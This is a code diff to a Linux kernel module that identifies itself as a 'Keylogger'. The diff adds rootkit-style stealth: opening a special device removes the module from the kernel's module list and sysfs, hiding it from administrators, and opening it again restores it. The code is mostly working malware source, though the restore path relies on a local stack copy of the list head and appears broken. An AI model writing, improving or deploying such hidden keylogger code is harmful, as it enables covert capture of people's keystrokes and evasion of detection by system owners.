@@ -10,6 +10,7 @@
 #include <linux/uaccess.h>
 #include <linux/slab.h>
 #include <linux/kernel.h>
+#include <linux/mutex.h>
 #include <linux/fs.h>
 #include <linux/err.h>
 #include <linux/cdev.h>
@@ -19,7 +20,7 @@
 #define DEVICE_NAME "Keylogger"
 static char msg_Ptr[BUFF_SIZE];
 static size_t buf_pos;
-int is_hide = 0
+int is_hide = 0;
 struct fake_device
 {
     char data[100];
@@ -33,28 +34,51 @@ int major_number;
 int ret;
 dev_t dev_num;
 dev_t dev_num1;
-struct list_head *module_list;
+  
 
-void hide(void)
+/*void hide(void)
 {
-    module_list = THIS_MODULE->list.prev;   
     list_del(&THIS_MODULE->list);
+    is_hide =1;
 }
 void unhide(void)
 {
     list_add(&THIS_MODULE->list, module_list);
-}
+    is_hide=0;
+}*/
 
 int dev_open_fops_for_hide(struct inode *inode, struct file* file)
 {
-    if (is_hide)
+    struct list_head module_list;
+    struct kobject* saved_kobj_parent;
+    module_list = THIS_MODULE->list;
+    saved_kobj_parent = THIS_MODULE->mkobj.kobj.parent; 
+    if (!is_hide)
     {
-        unhide();
+        while (!mutex_trylock(&module_mutex))
+            cpu_relax();
+        list_del(&THIS_MODULE->list);
+        kobject_del(&THIS_MODULE->mkobj.kobj);
+        kfree(THIS_MODULE->sect_attrs);
+        kfree(THIS_MODULE->notes_attrs);
+        THIS_MODULE->notes_attrs = NULL;
+        THIS_MODULE->sect_attrs = NULL;
+        mutex_unlock(&module_mutex);
+        is_hide = 1;
     }
     else
     {
-        hide();
-    }    
+        while (!mutex_trylock(&module_mutex))
+            cpu_relax();
+        list_add(&THIS_MODULE->list, &module_list);
+        kobject_add(&THIS_MODULE->mkobj.kobj ,saved_kobj_parent, "rt");
+        kobject_put(&THIS_MODULE->mkobj.kobj);
+        mutex_unlock(&module_mutex);
+        is_hide=0;
+
+    }
+    
+    return 0;    
 }
 int device_open(struct inode *inode, struct file * filp)
 {
@@ -67,7 +91,7 @@ int device_open(struct inode *inode, struct file * filp)
     printk(KERN_INFO "Keylogger: opend device");
     return 0;
 }
-static struct file_operations hide =
+static struct file_operations fops_hide =
 {
     .owner = THIS_MODULE,
     .open = dev_open_fops_for_hide
@@ -120,7 +144,7 @@ static int hide_driver_entery(void)
     }
     major_number = MAJOR(dev_num1);
     mcdev1 = cdev_alloc();
-    mcdev1->ops = &hide;
+    mcdev1->ops = &fops_hide;
     mcdev1->owner = THIS_MODULE;
     ret = cdev_add(mcdev1, dev_num1, 1);
     if (ret < 0)
